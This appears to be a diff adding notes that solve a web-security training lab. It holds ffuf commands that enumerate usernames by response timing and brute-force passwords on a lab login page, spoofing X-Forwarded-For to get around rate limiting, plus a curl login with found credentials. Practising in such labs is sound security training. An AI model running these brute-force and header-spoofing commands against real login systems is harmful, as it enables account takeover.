@@ -1,0 +1,23 @@
+
+
+
+ffuf -w username.txt \
+  -u https://0a6a001f0347815981027ab800630047.web-security-academy.net/login \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "X-Forwarded-For: 1.1.1.FUZZ" \
+  -d "username=FUZZ&password=alongpasswordasneeded" \
+  -mt ">30"
+
+
+ffuf -w password.txt:PASS \
+  -u https://0a6a001f0347815981027ab800630047.web-security-academy.net/login \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "X-Forwarded-For: 1.1.1.PASS" \
+  -d "username=announcements&password=PASS" \
+  -mc 302
+
+curl -s -X POST https://0a6a001f0347815981027ab800630047.web-security-academy.net/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=atlanta&password=peter"
